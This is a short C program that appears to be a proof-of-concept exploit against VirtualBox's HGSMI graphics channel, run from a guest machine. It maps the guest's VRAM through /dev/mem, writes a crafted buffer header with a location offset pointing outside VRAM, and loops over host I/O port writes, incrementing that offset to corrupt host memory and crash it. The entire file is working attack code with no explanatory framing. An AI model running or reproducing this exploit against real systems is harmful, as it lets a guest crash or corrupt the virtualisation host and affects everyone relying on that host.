#define _GNU_SOURCE

#include <sys/io.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <err.h>
#include <string.h>
#include <unistd.h>
#include "structures.h"

#define VGA_PORT_HGSMI_HOST             0x3B0
#define VGA_PORT_HGSMI_GUEST            0x3D0

#define VBE_DISPI_IOPORT_INDEX          0x01CE
#define VBE_DISPI_IOPORT_DATA           0x01CF

#define VRAM_PADDR 			0xE0000000

int mem;

uint8_t *map_phy_address(off_t address, size_t size)
{
	uint8_t *map;

	if (!mem) 
		mem = open("/dev/mem", O_RDWR | O_SYNC);

	map = mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
			mem, address);
	return map;
}


int main(int argc, char **argv)
{
	uint8_t *vram, *payload;
	uint64_t payload_offset;

	/* VBox variables */
	uint64_t cbVRAM;
	HGSMIBUFFERHEADER *pHeader;
	HGSMIBUFFERLOCATION *pLoc;

	iopl(3);

	cbVRAM = inl(VBE_DISPI_IOPORT_DATA);
	warnx("[+] VRAM buffer size = 0x%lx", cbVRAM);

	vram = map_phy_address(VRAM_PADDR, cbVRAM);
	if (vram == MAP_FAILED) 
		errx(EXIT_FAILURE, "[!] Error mapping VRAM buffer...");

	warnx("[+] VRAM buffer mapped @ %p", vram);

	/* Compute details of payload on VRAM */
	warnx("[+] Setting up payload...");
	payload_offset = cbVRAM - getpagesize();
	payload = vram + payload_offset;
	memset(payload, 0, getpagesize());

	pHeader = (struct HGSMIBUFFERHEADER *)payload;

	InitializeHeader(pHeader, 0xEEB, HGSMI_CH_HGSMI, 
			HGSMI_CC_HOST_FLAGS_LOCATION, payload_offset);

	/* Set offset to corrupt */
	pLoc = (HGSMIBUFFERLOCATION *)((uint8_t *)pHeader + sizeof (HGSMIBUFFERHEADER));
	pLoc->cbLocation = sizeof(HGSMIHOSTFLAGS);
	pLoc->offLocation = cbVRAM;			// point offset outside vram	

	warnx("[+] Triggering crash...");
	while (1) {
		outl(payload_offset, VGA_PORT_HGSMI_GUEST);
		outl(HGSMIOFFSET_VOID, VGA_PORT_HGSMI_HOST);
		pLoc->offLocation++;
	}

	return 0;
}
